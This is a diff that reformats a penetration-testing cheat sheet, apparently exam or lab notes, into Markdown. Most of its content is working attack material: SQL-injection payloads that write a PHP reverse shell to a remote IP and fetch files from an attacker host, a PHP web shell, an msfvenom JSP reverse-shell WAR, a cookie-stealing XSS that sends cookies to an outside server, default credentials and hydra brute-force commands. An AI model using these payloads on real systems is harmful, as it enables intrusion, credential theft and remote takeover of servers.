@@ -95,44 +95,53 @@ root@kali:~/Exam/Sicos1# python 34900.py payload=reverse rhost=192.168.88.155 lh
 nmap -sV -Pn -vv –script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.0.1 -p 3306
 ```
 MySQL login : ```sh mysql -h 192.168.88.152 -D wordpress -u root -p plbkac```
-MySQL Spawning Reverse shell(linux) : union select ""<?php exec(\""/bin/bash -c \'bash -i >& /dev/tcp/159.203.242.172/1999 0>&1\'\"");"" INTO OUTFILE '/var/www/ecustomers/samshell4.php' #
-UPLOAD A FILE
+MySQL Spawning Reverse shell(linux) : ```union select ""<?php exec(\""/bin/bash -c \'bash -i >& /dev/tcp/159.203.242.172/1999 0>&1\'\"");"" INTO OUTFILE '/var/www/ecustomers/samshell4.php' ```
+
+UPLOAD A FILE : 
+```
 ' union select ""<?php file_put_contents(\""root\"", file_get_contents(\""http://attack.samsclass.info/root\"")); ?>"" INTO OUTFILE '/var/www/ecustomers/samget2.php' #
-OPEN A PHP SHELL
-' union select ""<?php system($_REQUEST['cmd']); ?>"" INTO OUTFILE '/var/www/ecustomers/samshell.php' #"
+```
+OPEN A PHP SHELL :
+```
+' union select ""<?php system($_REQUEST['cmd']); ?>"" INTO OUTFILE '/var/www/ecustomers/samshell.php' #
+```
 
 
-IIS 	"nitko scan results; IIS version; windows OS version can be revealed
-dirb http://10.11.1.72 /usr/share/dirb/wordlists/common.txt
-auxiliary/admin/http/iis_auth_bypass"
-"Tomcat
-tomcat/tomcat"	"/manager/index.html
-http://10.11.1.209:8080/manager/html
-upload msfvenom jsp or war file
+## - **Windows IIS** <br />
+Getting Windows 0S and version details through Nikto / Nmap  Scanning. 
+
+auxiliary/admin/http/iis_auth_bypass
+
+## - **Tomcat** <br />
+Default cred for Tomcat;"tomcat/tomcat"	 and check out /manager console by navigating to browsereg. http://10.11.1.209:8080/manager/html
+You can upload reverse shell on manager consor ; msfvenom jsp or war file
+```sh
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.37 LPORT=443 -f war > shell.war
-root@kali:~/PWK-Lab/10.11.1.209# jar -xvf shell.war"
-PHP + DB cred files	"/etc/mysql/my.cnf 
-/var/www/html/config.php"
-SQL injection	"https://sql--injection.blogspot.com/p/the-process.html
-https://grosquildu.github.io/pentests/web/"
-Cookie stealing xss	"<script> new Image().src=""http://10.11.0.42:81/bogus.php?output=""+document.cookie; </script> 
-"
-"wordpress
-(needs to use new kali)"	"wpscan --url http://10.11.1.71/ -enumerate p
+jar -xvf shell.war
+```
+## - **Config files** <br />
+PHP + DB cred files	
+```sh
+/etc/mysql/my.cnf 
+/var/www/html/config.php
+```
+## - **WordPress** <br />
+```sh
+wpscan --url http://10.11.1.71/ -enumerate p
 wpscan --url 10.0.2.4 --enumerate vp
 wpscan --url https://192.168.88.152:12380/blogblog -enumerate u --disable-tls-checks
 wpscan --url http://192.168.88.179/wordpress/ --wordlist /usr/share/wordlists/rockyou.txt
 wpscan --url https://192.168.88.152:12380/blogblog/ --enumerate ap --disable-tls-checks
 wpscan --url www.local.test --enumerate u --threads 50
-lets find a username ; https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32
-find a password(autoscript) : https://github.com/claudioviviani/bash-wordpress-xml-bruteforce
-https://www.sunnyhoi.com/hack-wordpress-website-using-wpscan-metasploit/
-elliot has administrative access on WP, which means we can easily change 404.php file with a reverse shell. Go to Appearance -> Editor and swap the 404.php code with your modified revsh. Make sure you change the IP and PORT in the php file. Then start a listener and hit a random page like http://192.168.1.72/idontexist."
-"phpMyAdmin
+```
+ref : finding username & password(autoscript) : https://github.com/claudioviviani/bash-wordpress-xml-bruteforce
+
+## - **PHPAdmin** <br />
 http://*.*.*.*/phpmyadmin
-db and password located @
-/etc/phpmyadmin/config-db.php"	"cred(root/blank)(pma/blank)
-hydra 10.10.10.43 -l admin -P /usr/share/dict/rockyou.txt http-post-form ""/department/login.php:username=^USER^&password=^PASS^:Invalid Password!""
+db and password located @ /etc/phpmyadmin/config-db.php and default cred can be; (root/blank)(pma/blank)
+You can also bruteforce by ```sh
+hydra 10.10.10.43 -l admin -P /usr/share/dict/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"```
+
 upload malicious database as .php 
 ref : http://hackingandsecurity.blogspot.com/2017/08/proj-12-exploiting-php-vulnerabilities.html
 SQL-phpshellscript : 
